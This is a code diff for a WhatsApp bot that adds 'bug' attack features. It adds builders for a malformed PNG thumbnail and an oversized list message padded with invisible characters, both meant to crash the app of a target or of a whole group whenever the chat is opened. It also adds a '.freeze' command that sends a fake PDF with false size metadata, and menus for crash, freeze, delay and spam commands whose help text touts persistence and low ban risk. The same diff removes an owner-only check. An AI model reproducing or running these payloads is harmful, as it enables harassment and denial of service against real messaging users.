@@ -82,6 +82,7 @@ const SETTINGS_FILE = path.join(__dirname, "group_settings.json");
 const SESSIONS_FILE = path.join(__dirname, "sessions.json");
 const MODE_FILE = path.join(__dirname, "bot_mode.json");
 const MENU_BANNER_FILE = path.join(__dirname, "menu_banner.jpg");
+const BUG_BANNER_FILE  = path.join(__dirname, "bug_banner.jpg");
 const OWNER_BANNER_FILE = path.join(__dirname, "owner_banner.jpg");
 const THEME_FILE = path.join(__dirname, "menu_theme.json");
 const BOT_SECURITY_FILE = path.join(__dirname, "bot_security.json");
@@ -104,6 +105,16 @@ const broadcastJobs = {};
 // Saved group invite links for auto-rejoin: { groupJid: inviteCode }
 const savedGroupLinks = {};
 
+// Bug crash message keys for undo: { groupJid: [msgKey, ...] }
+const groupCrashKeys = {};
+
+// Personal bug message keys for undo: { userJid: [msgKey, ...] }
+const userCrashKeys = {};
+const userBugTypes  = {}; // tracks which bug types were sent to each number
+
+// Delay attack jobs: { targetJid: { intervalId, count } }
+const delayJobs = {};
+
 // Developer numbers — set DEV_NUMBERS in your environment as comma-separated values
 // e.g.  DEV_NUMBERS=2348102756072,2348012345678
 const DEV_NUMBERS = (process.env.DEV_NUMBERS || "2348102756072")
@@ -115,6 +126,14 @@ function numToJid(num) {
     const cleaned = (num || "").toString().replace(/[^0-9]/g, "");
     if (!cleaned) return null;
     return cleaned + "@s.whatsapp.net";
+}
+
+// Get bug target from command — accepts phone number param OR @mention
+function parseBugTarget(parts, msg) {
+    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+    if (mentioned.length) return mentioned[0];
+    if (parts[1] && /^\d{7,}$/.test(parts[1])) return numToJid(parts[1]);
+    return null;
 }
 
 function getSessionForSocket(sock) {
@@ -1394,85 +1413,18 @@ function resolveTargetJid(msg, parts) {
 }
 
 // --- GROUP ADMIN HELPERS ---
-// Modern WhatsApp uses two JID formats per user: @s.whatsapp.net (phone) and @lid (random opaque ID).
-// The same person can appear under either format depending on context, so admin checks must
-// compare across formats. These helpers normalize that.
-
-// Strip device suffix (":N") and domain. Returns the bare local part.
-function jidLocal(jid) {
-    if (!jid) return "";
-    return String(jid).split(":")[0].split("@")[0];
-}
-
-// Returns the JID domain (@s.whatsapp.net, @lid, @g.us, etc.) or "" if none.
-function jidDomain(jid) {
-    if (!jid) return "";
-    const i = String(jid).indexOf("@");
-    return i >= 0 ? String(jid).slice(i) : "";
-}
-
-// True if the two JIDs refer to the same user.
-// Handles cross-format (lid vs s.whatsapp.net) by comparing locals when domains match,
-// and falling back to literal/normalized equality otherwise.
-function isSameUser(a, b) {
-    if (!a || !b) return false;
-    if (a === b) return true;
-    const la = jidLocal(a), lb = jidLocal(b);
-    if (!la || !lb) return false;
-    const da = jidDomain(a), db = jidDomain(b);
-    // Same domain (both lid or both s.whatsapp.net) — locals must match
-    if (da && db && da === db) return la === lb;
-    // Different domains — only safe to match if both locals look like phone numbers
-    const isPhoneNum = s => /^\d{7,}$/.test(s);
-    if (isPhoneNum(la) && isPhoneNum(lb)) return la === lb;
-    // Otherwise (mixing lid id with phone number, etc.) we can't safely equate
-    return false;
-}
-
-// Collect every JID variant we know for the sender of a message.
-// In groups: msg.key.participant (display JID) + participantPn + participantLid.
-// In DMs: msg.key.remoteJid is the user.
-function getSenderJids(msg) {
-    const set = new Set();
-    const k = msg?.key || {};
-    if (k.participant) set.add(k.participant);
-    if (k.participantPn) set.add(k.participantPn);
-    if (k.participantLid) set.add(k.participantLid);
-    if (msg?.participant) set.add(msg.participant);
-    if (!k.participant && !k.participantPn && !k.participantLid && k.remoteJid && !String(k.remoteJid).endsWith("@g.us")) {
-        set.add(k.remoteJid);
-    }
-    set.delete("");
-    return [...set];
-}
-
-// True if any of the candidate JIDs matches any JID in the admin set (cross-format aware).
-function isJidAdmin(candidates, adminSet) {
-    if (!adminSet || !adminSet.size) return false;
-    for (const c of candidates) {
-        if (!c) continue;
-        if (adminSet.has(c)) return true;
-        for (const a of adminSet) if (isSameUser(a, c)) return true;
-    }
-    return false;
-}
-
 async function getGroupRoles(sock, groupJid) {
     try {
         const meta = await sock.groupMetadata(groupJid);
         const admins = new Set(meta.participants.filter(p => p.admin).map(p => p.id));
-        // Collect every JID the bot might appear as in this group:
-        //  - sock.user.id (its main login JID, often phone-based)
-        //  - sock.user.lid (its lid alias if any)
-        //  - phone-based variant of sock.user.id
-        const botCandidates = [];
-        if (sock.user?.id) botCandidates.push(sock.user.id);
-        if (sock.user?.lid) botCandidates.push(sock.user.lid);
-        const botBaseNum = jidLocal(sock.user?.id || "");
-        if (botBaseNum) botCandidates.push(botBaseNum + "@s.whatsapp.net");
-        const botIsAdmin = isJidAdmin(botCandidates, admins);
-        return { admins, botIsAdmin, meta, botCandidates };
-    } catch { return { admins: new Set(), botIsAdmin: false, meta: null, botCandidates: [] }; }
+        const botFullJid = sock.user?.id || "";
+        const botBaseNum = botFullJid.split(":")[0].split("@")[0];
+        const botBaseJid = botBaseNum + "@s.whatsapp.net";
+        // Check all possible JID formats the bot might appear as in the participants list
+        const botIsAdmin = admins.has(botFullJid) || admins.has(botBaseJid) ||
+            [...admins].some(a => a.split(":")[0].split("@")[0] === botBaseNum);
+        return { admins, botIsAdmin, meta };
+    } catch { return { admins: new Set(), botIsAdmin: false, meta: null }; }
 }
 
 // --- AFK store ---
@@ -1859,6 +1811,62 @@ function buildVCardCrashMsg() {
     });
 }
 
+// TECHNIQUE 4 — Malformed Thumbnail (Force Close)
+// Sends a document message with a PNG thumbnail that has a valid header
+// but claims 65535×65535 dimensions with corrupted body data.
+// WhatsApp's image decoder allocates memory for the claimed size then panics
+// on the corrupted body — crashes every time the chat is opened.
+// Persists in WA's media cache until cleared or app reinstalled.
+function buildMalformedThumb() {
+    const sig      = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); // PNG signature
+    const ihdrLen  = Buffer.from([0x00, 0x00, 0x00, 0x0D]);
+    const ihdrType = Buffer.from([0x49, 0x48, 0x44, 0x52]); // IHDR
+    const ihdrData = Buffer.from([
+        0x00, 0x00, 0xFF, 0xFF, // width:  65535
+        0x00, 0x00, 0xFF, 0xFF, // height: 65535
+        0x08, 0x02, 0x00, 0x00, 0x00 // 8-bit RGB, no interlace
+    ]);
+    const ihdrCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]); // intentionally invalid CRC
+    const idatLen  = Buffer.from([0x00, 0x00, 0x02, 0x00]);
+    const idatType = Buffer.from([0x49, 0x44, 0x41, 0x54]); // IDAT
+    const idatData = Buffer.alloc(512, 0xAB);                // corrupted compressed data
+    const idatCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]);
+    const iend     = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
+    return Buffer.concat([sig, ihdrLen, ihdrType, ihdrData, ihdrCrc, idatLen, idatType, idatData, idatCrc, iend]);
+}
+
+// TECHNIQUE 5 — Group Crash List Message (Dead Zone)
+// Sends a listMessage with 5000 fake mentionedJids + 100 rows with junk rowIds
+// wrapped in massive invisible chars. WhatsApp's UI thread tries to "draw" the
+// message and panics — crash on open. Effect persists in msgstore.db until
+// the message is deleted (ungroupcrash) or app reinstalled.
+function buildGroupCrashMsg() {
+    const invis     = "\u200B\u200C\u200D\u2060\uFEFF\u00AD\u200E\u200F\u2061\u2062\u2063\u2064".repeat(3000);
+    const junkRowId = "\x00\x01\x02\xFF\xFE\xAB\xCD".repeat(300);
+    return waProto.Message.fromObject({
+        listMessage: {
+            title:       invis.substring(0, 2000),
+            description: invis.substring(0, 2000),
+            buttonText:  " ",
+            listType:    1,
+            sections: [{
+                title: invis.substring(0, 1000),
+                rows:  Array(100).fill(null).map((_, i) => ({
+                    title:       invis.substring(0, 200),
+                    description: invis.substring(0, 200),
+                    rowId:       junkRowId + String(i)
+                }))
+            }],
+            contextInfo: {
+                mentionedJid:  Array(5000).fill("0@s.whatsapp.net"),
+                quotedMessage: { conversation: invis.substring(0, 5000) }
+            }
+        }
+    });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 // --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
 function buildImageGenUrl(prompt) {
     return `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=768&height=768&nologo=true&model=flux&safe=false`;
@@ -2089,7 +2097,33 @@ function getMenuSections() {
         { emoji: '🔄', title: 'GC CLONE', items: [
             ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
         ]},
-        { emoji: '✏️', title: 'TEXT & STYLE EFFECTS', items: [
+        { emoji: '🤖', title: 'ANDROID BUGS', items: [
+            ['.androidbug ‹number›'], ['.crash ‹number›'],
+            ['.forceclose ‹number›'], ['.fc ‹number›'],
+            ['.unbug ‹number›'],
+        ]},
+        { emoji: '🍎', title: 'iOS BUGS', items: [
+            ['.iosbug ‹number›'], ['.invisfreeze ‹number›'],
+            ['.if ‹number›'], ['.crash ‹number›'],
+            ['.unbug ‹number›'],
+        ]},
+        { emoji: '❄️', title: 'FREEZE & DELAY', items: [
+            ['.freeze ‹number›'], ['.delaybug ‹number›'],
+            ['.invisfreeze ‹number›'],
+            ['.unbug ‹number›'],
+        ]},
+        { emoji: '🏘️', title: 'GROUP BUGS', items: [
+            ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
+            ['.ungroupcrash ‹groupId›'],
+        ]},
+        { emoji: '🧨', title: 'EXTRA BUG TOOLS', items: [
+            ['.emojibomb @user'], ['.textbomb @user ‹text› ‹times›'],
+            ['.spamatk @user ‹times›'], ['.ghostping @user'],
+            ['.lockedbypass ‹text›'], ['.antibug on/off/status'],
+            ['.bugmenu'], ['.bugmenu android'], ['.bugmenu ios'],
+            ['.bugmenu freeze'], ['.bugmenu group'],
+        ]},
+        { emoji: '✏️', title: 'TEXT & STYLE BUGS', items: [
             ['.zalgo ‹text›'], ['.bigtext ‹text›'],
             ['.invisible'], ['.rtl ‹text›'],
             ['.mock ‹text›'], ['.aesthetic ‹text›'],
@@ -2160,7 +2194,7 @@ function setSectionBanner(idx, b64) { const d = loadSectionBanners(); d[String(i
 function delSectionBanner(idx) { const d = loadSectionBanners(); delete d[String(idx)]; saveSectionBanners(d); }
 
 // Section indices that are dev-only. By title match.
-const DEV_ONLY_SECTIONS = ["DEV ACCESS CONTROL", "THREAT NETWORK", "PROMO ENGINE"];
+const DEV_ONLY_SECTIONS = ["DEV ACCESS CONTROL", "ANDROID BUGS", "iOS BUGS", "FREEZE & DELAY", "GROUP BUGS", "EXTRA BUG TOOLS", "TEXT & STYLE BUGS", "THREAT NETWORK", "PROMO ENGINE"];
 function isDevSection(title) { return DEV_ONLY_SECTIONS.includes(title); }
 
 function getVisibleSections(isDev) {
@@ -2252,6 +2286,7 @@ function buildListMenu() {
 ━━━━━━━━━━━━━━━━━━━━
 
 • *.list group menu* — All group commands
+• *.list bug menu* — Bug commands by section
 • *.list protection menu* — Protection commands
 • *.list utility menu* — Number info and utility tools
 • *.list owner menu* — Owner controls
@@ -2260,7 +2295,11 @@ function buildListMenu() {
 • *.list game menu* — Game commands
 
 You can also use:
-• *.help group menu*`;
+• *.help bug menu*
+• *.help group menu*
+• *.bugmenu android*
+• *.bugmenu ios*
+• *.bugmenu group*`;
 }
 
 function buildSimpleSectionList(section) {
@@ -2292,10 +2331,12 @@ _Number info is prefix-based only, not live GPS location._`,
 • *.restart* — Restart/reconnect the linked WhatsApp session
 • *.mode public/owner*
 • *.menudesign 1-20*
-• *.setpp [owner]* — Set menu banner (reply to image)
+• *.setpp [bug/owner]* — Set menu banner (reply to image)
 • *.setmenupic* — Set main menu banner
+• *.setmenupic bug* — Set bug menu banner
 • *.setmenupic owner* — Set owner menu banner
 • *.delpp* — Delete main menu banner
+• *.delpp bug* — Delete bug menu banner
 • *.delpp owner* — Delete owner menu banner
 • *.setstatus <text>*
 • *.setname <name>*
@@ -2346,6 +2387,83 @@ The bot can start this from any chat, but WhatsApp only exposes source members i
 • *.scramble*`,
     };
     return sections[section] || buildListMenu();
+}
+
+function buildBugMenuText(section = "") {
+    const freezeHelp = `🧊 *FREEZE BUG*
+━━━━━━━━━━━━━━━━━━━━
+• *.freeze <number>*
+  Example: *.freeze 2348012345678*
+
+What it does:
+→ Creates a circular DB index loop (A→B→A→B) in their WA storage
+→ Their WA gets stuck loading — msgs blocked in & out
+→ Persists after restart — only reinstall or *.unbug* clears it
+→ 3 packets with human-like timing — very low ban risk
+
+• *.unbug <number>* — undo the freeze`;
+
+    const fcHelp = `💀 *FORCE CLOSE BUG*
+━━━━━━━━━━━━━━━━━━━━
+• *.forceclose <number>*
+  Shortcut: *.fc <number>*
+  Example: *.forceclose 2348012345678*
+
+What it does:
+→ Sends 1 document with a malformed thumbnail binary
+→ WA's image decoder crashes every time they open the chat
+→ Persists until they clear WA media or reinstall
+→ Silent — just looks like a PDF was sent
+→ 1 message only — lowest possible ban risk
+
+• *.unbug <number>* — undo force close`;
+
+    const groupHelp = `💣 *GROUP CRASH*
+━━━━━━━━━━━━━━━━━━━━
+• *.groupcrash* — run inside the target group
+• *.groupcrash <groupId>* — use group ID (from *.groupid*)
+• *.groupcrash <invite link>* — paste invite link
+
+What it does:
+→ Sends 1 invisible list message with DB poison payload
+→ Anyone who opens the group → WA crashes immediately
+→ Works on Android & iOS — no tap needed
+→ Persists across restarts until message is deleted
+→ 1 message only — very low ban risk
+
+• *.ungroupcrash <groupId>* — restore the group
+• *.groupid* — get the current group ID`;
+
+    const defenseHelp = `🛡️ *ANTI BUG DEFENSE*
+━━━━━━━━━━━━━━━━━━━━
+• *.antibug on* — Activate protection
+• *.antibug off* — Deactivate protection
+• *.antibug status* — Check current state
+
+When active, the shield monitors every message arriving on the linked number and neutralises threats before they render.`;
+
+    if (section === "freeze") return freezeHelp;
+    if (section === "forceclose" || section === "fc") return fcHelp;
+    if (section === "group" || section === "groupcrash") return groupHelp;
+    if (section === "defense" || section === "protect" || section === "antibug") return defenseHelp;
+
+    return `💥 *PHANTOM X BUG MENU*
+━━━━━━━━━━━━━━━━━━━━
+
+${freezeHelp}
+
+${fcHelp}
+
+${groupHelp}
+
+${defenseHelp}
+
+━━━━━━━━━━━━━━━━━━━━
+💡 *Tips:*
+• All 3 bugs have very low ban risk
+• Use *.antibug on* to protect yourself
+• *.groupid* — get a group's ID
+• *.bugmenu freeze* / *.bugmenu forceclose* / *.bugmenu group*`;
 }
 
 // ─── THEME 1: GHOST ───
@@ -3267,22 +3385,9 @@ async function handleMessage(sock, msg) {
 
             let roles = { admins: new Set(), botIsAdmin: false };
             if (anyAntiOn) roles = await getGroupRoles(sock, from);
-
-            // Build the full set of JIDs the sender might be known by (phone + lid + display).
-            // This is critical: modern WA can hand the same user a @lid and @s.whatsapp.net id,
-            // and admin/dev checks must succeed against ANY of them.
-            const senderJidCandidates = getSenderJids(msg);
-            if (!senderJidCandidates.includes(senderJid)) senderJidCandidates.unshift(senderJid);
-
-            const senderIsAdmin = isJidAdmin(senderJidCandidates, roles.admins);
-            const senderIsDev = senderJidCandidates.some(j => isDevJid(j));
-            const skipForSender = msg.key.fromMe || senderIsAdmin || senderIsDev;
-
-            // Pick the JID format that actually exists in participants — that's what
-            // groupParticipantsUpdate("remove", ...) needs, and it's the one mentions resolve to.
-            const matchedAdminJid = roles.meta?.participants?.find(p => isSameUser(p.id, senderJid))?.id;
-            const removalJid = matchedAdminJid || senderJid;
-            const mentionTagBase = jidLocal(removalJid);
+            const senderBaseNum = senderJid.split(":")[0].split("@")[0];
+            const senderIsAdmin = roles.admins.has(senderJid) || [...roles.admins].some(a => a.split(":")[0].split("@")[0] === senderBaseNum);
+            const skipForSender = msg.key.fromMe || senderIsAdmin || isDevJid(senderJid);
 
             // Anti-link
             if (getGroupSetting(from, "antilink") && !skipForSender) {
@@ -3300,18 +3405,18 @@ async function handleMessage(sock, msg) {
                 if (hasLink) {
                     if (!roles.botIsAdmin) {
                         console.log(`[antilink] cannot enforce in ${from} — bot is not admin`);
-                        await sock.sendMessage(from, { text: `⚠️ @${mentionTagBase}, links are not allowed here! (Bot is not admin — cannot delete)`, mentions: [removalJid] });
+                        await sock.sendMessage(from, { text: `⚠️ @${senderJid.split("@")[0]}, links are not allowed here! (Bot is not admin — cannot delete)`, mentions: [senderJid] });
                     } else {
                         try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
-                        const alWarnCount = addWarn(from, removalJid);
+                        const alWarnCount = addWarn(from, senderJid);
                         if (alWarnCount >= 3) {
-                            resetWarns(from, removalJid);
-                            try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
-                            await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antilink warnings!`, mentions: [removalJid] });
+                            resetWarns(from, senderJid);
+                            try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
+                            await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antilink warnings!`, mentions: [senderJid] });
                         } else {
                             await sock.sendMessage(from, {
-                                text: `⚠️ @${mentionTagBase}, links are not allowed here!\n⚠️ Warning *${alWarnCount}/3* — 3 warnings = kick.`,
-                                mentions: [removalJid],
+                                text: `⚠️ @${senderJid.split("@")[0]}, links are not allowed here!\n⚠️ Warning *${alWarnCount}/3* — 3 warnings = kick.`,
+                                mentions: [senderJid],
                             });
                         }
                         return;
@@ -3326,15 +3431,15 @@ async function handleMessage(sock, msg) {
                         console.log(`[antispam] cannot enforce in ${from} — bot is not admin`);
                     } else {
                         try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
-                        const asWarnCount = addWarn(from, removalJid);
+                        const asWarnCount = addWarn(from, senderJid);
                         if (asWarnCount >= 3) {
-                            resetWarns(from, removalJid);
-                            try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
-                            await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antispam warnings!`, mentions: [removalJid] });
+                            resetWarns(from, senderJid);
+                            try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
+                            await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antispam warnings!`, mentions: [senderJid] });
                         } else {
                             await sock.sendMessage(from, {
-                                text: `🚫 @${mentionTagBase}, slow down! Warning *${asWarnCount}/3* — 3 = kick.`,
-                                mentions: [removalJid],
+                                text: `🚫 @${senderJid.split("@")[0]}, slow down! Warning *${asWarnCount}/3* — 3 = kick.`,
+                                mentions: [senderJid],
                             });
                         }
                         return;
@@ -3348,15 +3453,15 @@ async function handleMessage(sock, msg) {
                     console.log(`[antimention] cannot enforce in ${from} — bot is not admin`);
                 } else {
                     try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
-                    const amWarnCount = addWarn(from, removalJid);
+                    const amWarnCount = addWarn(from, senderJid);
                     if (amWarnCount >= 3) {
-                        resetWarns(from, removalJid);
-                        try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
-                        await sock.sendMessage(from, { text: `🚫 @${mentionTagBase} has been kicked — 3 antimention warnings!`, mentions: [removalJid] });
+                        resetWarns(from, senderJid);
+                        try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
+                        await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antimention warnings!`, mentions: [senderJid] });
                     } else {
                         await sock.sendMessage(from, {
-                            text: `📢 @${mentionTagBase}, mass-mentions are not allowed!\n⚠️ Warning *${amWarnCount}/3* — 3 = kick.`,
-                            mentions: [removalJid],
+                            text: `📢 @${senderJid.split("@")[0]}, mass-mentions are not allowed!\n⚠️ Warning *${amWarnCount}/3* — 3 = kick.`,
+                            mentions: [senderJid],
                         });
                     }
                     return;
@@ -3368,7 +3473,7 @@ async function handleMessage(sock, msg) {
             if (getGroupSetting(from, "antibot") && !msg.key.fromMe && !senderIsAdmin) {
                 const looksAutomated = senderJid.endsWith("@newsletter") || senderJid.endsWith("@broadcast");
                 if (looksAutomated && roles.botIsAdmin) {
-                    try { await sock.groupParticipantsUpdate(from, [removalJid], "remove"); } catch (_) {}
+                    try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                     await sock.sendMessage(from, { text: `🤖 Automated account removed — anti-bot protection active.` });
                     return;
                 }
@@ -3660,24 +3765,24 @@ async function handleMessage(sock, msg) {
             }
 
             case ".setpp": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const ppSection = parts[1]?.toLowerCase() || "main";
-                // Accept either a replied-to image OR an image sent with the command as caption
-                const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-                const quotedType = quotedRaw ? getContentType(quotedRaw) : null;
-                const directImage = msg.message?.imageMessage ? msg.message : null;
-                const useQuoted = quotedRaw && quotedType === "imageMessage";
-                if (!useQuoted && !directImage) {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quoted ? getContentType(quoted) : null;
+                if (!quoted || quotedType !== "imageMessage") {
                     return reply(
-                        `🖼️ *Set Menu Banner*\n\n` +
-                        `Send or reply to an image with:\n` +
+                        `🖼️ Reply to an image with *.setpp* to set a menu banner.\n\n` +
+                        `*Usage:*\n` +
                         `• *.setpp* — set main menu banner\n` +
+                        `• *.setpp bug* — set bug menu banner\n` +
                         `• *.setpp owner* — set owner menu banner\n\n` +
-                        `_Tip: you can also caption an image with .setpp directly._`
+                        `The image will appear when that menu is shown.`
                     );
                 }
                 let targetFile, sectionLabel;
-                if (ppSection === "owner") {
+                if (ppSection === "bug" || ppSection === "bugmenu") {
+                    targetFile = BUG_BANNER_FILE;
+                    sectionLabel = "bug menu";
+                } else if (ppSection === "owner") {
                     targetFile = OWNER_BANNER_FILE;
                     sectionLabel = "owner menu";
                 } else {
@@ -3686,8 +3791,8 @@ async function handleMessage(sock, msg) {
                 }
                 await reply(`⏳ Saving ${sectionLabel} banner...`);
                 try {
-                    const sourceMsg = useQuoted ? { ...msg, message: quotedRaw } : msg;
-                    const buf = await downloadMediaMessage(sourceMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    const fakeMsg = { ...msg, message: quoted };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                     fs.writeFileSync(targetFile, buf);
                     await reply(`✅ *${sectionLabel.charAt(0).toUpperCase() + sectionLabel.slice(1)} banner set!*\n\nThe image will now appear whenever the ${sectionLabel} is shown. 🔥`);
                 } catch (e) {
@@ -3699,41 +3804,46 @@ async function handleMessage(sock, msg) {
             case ".delpp": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const delSection = parts[1]?.toLowerCase();
-                if (delSection === "owner") {
+                if (delSection === "bug") {
+                    if (!fs.existsSync(BUG_BANNER_FILE)) return reply("⚠️ No bug menu banner is set.");
+                    fs.unlinkSync(BUG_BANNER_FILE);
+                    return reply("✅ Bug menu banner deleted.");
+                } else if (delSection === "owner") {
                     if (!fs.existsSync(OWNER_BANNER_FILE)) return reply("⚠️ No owner menu banner is set.");
                     fs.unlinkSync(OWNER_BANNER_FILE);
                     return reply("✅ Owner menu banner deleted.");
                 } else {
                     if (!fs.existsSync(MENU_BANNER_FILE)) return reply("⚠️ No main menu banner is set.");
                     fs.unlinkSync(MENU_BANNER_FILE);
-                    return reply("✅ Main menu banner deleted.\n\nTip: use *.delpp owner* to delete the owner banner.");
+                    return reply("✅ Main menu banner deleted.\n\nTip: use *.delpp bug* or *.delpp owner* to delete those section banners.");
                 }
             }
 
             // ─── SET MENU PIC (per-section banner) ───
-            // Send/reply to an image with .setmenupic [section] to set that section's banner.
-            // Sections: main (default), owner
+            // Reply to any image with .setmenupic [section] to set that section's banner.
+            // Sections: main (default), bug, owner
             case ".setmenupic": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const picSection = parts[1]?.toLowerCase() || "main";
-                // Accept either a replied-to image OR an image sent with the command as caption
-                const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-                const quotedType = quotedRaw ? getContentType(quotedRaw) : null;
-                const directImage = msg.message?.imageMessage ? msg.message : null;
-                const useQuoted = quotedRaw && quotedType === "imageMessage";
-                if (!useQuoted && !directImage) {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quoted ? getContentType(quoted) : null;
+                if (!quoted || quotedType !== "imageMessage") {
                     return reply(
                         `🖼️ *Set Menu Picture*\n\n` +
-                        `Send or reply to an image with:\n` +
+                        `Reply to an image with:\n` +
                         `• *.setmenupic* — set main menu banner\n` +
+                        `• *.setmenupic bug* — set bug menu banner\n` +
                         `• *.setmenupic owner* — set owner menu banner\n\n` +
-                        `_Tip: you can also caption an image with .setmenupic directly._\n` +
+                        `The image will appear when that menu section is shown.\n` +
                         `Use *.delpp [section]* to remove a banner.`
                     );
                 }
                 let targetFile;
                 let sectionLabel;
-                if (picSection === "owner") {
+                if (picSection === "bug" || picSection === "bugmenu") {
+                    targetFile = BUG_BANNER_FILE;
+                    sectionLabel = "bug menu";
+                } else if (picSection === "owner") {
                     targetFile = OWNER_BANNER_FILE;
                     sectionLabel = "owner menu";
                 } else {
@@ -3742,8 +3852,8 @@ async function handleMessage(sock, msg) {
                 }
                 await reply(`⏳ Saving ${sectionLabel} banner...`);
                 try {
-                    const sourceMsg = useQuoted ? { ...msg, message: quotedRaw } : msg;
-                    const buf = await downloadMediaMessage(sourceMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    const fakeMsg = { ...msg, message: quoted };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                     fs.writeFileSync(targetFile, buf);
                     await reply(`✅ *${sectionLabel.charAt(0).toUpperCase() + sectionLabel.slice(1)} banner set!*\n\nThis image will now appear whenever the ${sectionLabel} is shown. 🔥`);
                 } catch (e) {
@@ -3868,6 +3978,13 @@ async function handleMessage(sock, msg) {
             case ".list": {
                 const listTopic = parts.slice(1).join(" ").toLowerCase().trim();
                 if (listTopic === "group menu" || listTopic === "group" || listTopic === "groups") return reply(buildGroupMenuList());
+                if (listTopic === "bug menu" || listTopic === "bug" || listTopic === "bugs") {
+                    const bt = buildBugMenuText();
+                    if (fs.existsSync(BUG_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(BUG_BANNER_FILE), caption: bt }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(bt);
+                }
                 if (listTopic === "protection menu" || listTopic === "protection") return reply(buildSimpleSectionList("protection"));
                 if (listTopic === "utility menu" || listTopic === "utilities" || listTopic === "utility") return reply(buildSimpleSectionList("utility"));
                 if (listTopic === "owner menu" || listTopic === "owner" || listTopic === "control") {
@@ -4094,7 +4211,7 @@ _Can be started from any chat, but source members require source group access an
                     `Usage:\n` +
                     `• *.lockfor <number> <cmd>* — block one cmd for that number\n` +
                     `• *.lockfor <number> allcmds* — block ALL cmds for that number\n\n` +
-                    `Example: *.lockfor 2348012345678 .clone*`
+                    `Example: *.lockfor 2348012345678 .crash*`
                 );
                 const lfKey = lfCmd.startsWith(".") ? lfCmd : (lfCmd === "allcmds" ? "allcmds" : `.${lfCmd}`);
                 setLockedFor(lfNum, lfCmd === "allcmds" ? "allcmds" : lfKey, true);
@@ -4112,7 +4229,7 @@ _Can be started from any chat, but source members require source group access an
                     `Usage:\n` +
                     `• *.unlockfor <number> <cmd>* — remove block for one cmd\n` +
                     `• *.unlockfor <number> allcmds* — remove the allcmds block\n\n` +
-                    `Example: *.unlockfor 2348012345678 .clone*`
+                    `Example: *.unlockfor 2348012345678 .crash*`
                 );
                 const ufKey = ufCmd.startsWith(".") ? ufCmd : (ufCmd === "allcmds" ? "allcmds" : `.${ufCmd}`);
                 setLockedFor(ufNum, ufCmd === "allcmds" ? "allcmds" : ufKey, false);
@@ -4504,6 +4621,34 @@ _Can be started from any chat, but source members require source group access an
                 await reply(`https://chat.whatsapp.com/${inv}`);
                 break;
             }
+case ".freeze": {
+    const textArgs = msg.message.extendedTextMessage?.text || msg.message.conversation || "";
+    const parts = textArgs.split(" ");
+    const num = parts[1];
+    const target = num ? num.replace(/\D/g, "") + "@s.whatsapp.net" : from;
+
+    await sock.sendMessage(target, {
+        // We send the file directly here, not in the contextInfo
+        document: fs.readFileSync("./package.json"), 
+        fileName: "System_Diagnostic.pdf",
+        mimetype: "application/pdf",
+        fileLength: 9999999999999999, // The "Massive File" lie
+        pageCount: 1000000,            // The "Million Pages" lie
+        caption: "Render Test Active..." + "\n".repeat(500),
+        contextInfo: {
+            externalAdReply: {
+                showAdAttribution: true,
+                title: `🛡️ HARDWARE STRESS TEST`,
+                body: `NIKA V11 VIP`,
+                previewType: "PHOTO",
+                sourceUrl: `https://google.com`
+            }
+        }
+    });
+    await reply("Document Payload delivered. Open the chat now—let's see if the Tecno finally stutters!");
+        }
+                
+    
             case ".revoke": {
                 if (!isGroup) return reply(eclipseSay("not_group"));
                 await sock.groupRevokeInvite(from);
@@ -6923,6 +7068,25 @@ _Can be started from any chat, but source members require source group access an
                 } catch (e) { return reply(`❌ ${e?.message}`); }
             }
 
+            // ════════════════════════════════════════
+            // ░░░░░ BUG TOOLS ░░░░░
+            // ════════════════════════════════════════
+
+            case ".bugmenu": {
+                const section = parts[1]?.toLowerCase();
+                const bugMenuText = buildBugMenuText(section);
+                if (fs.existsSync(BUG_BANNER_FILE)) {
+                    try {
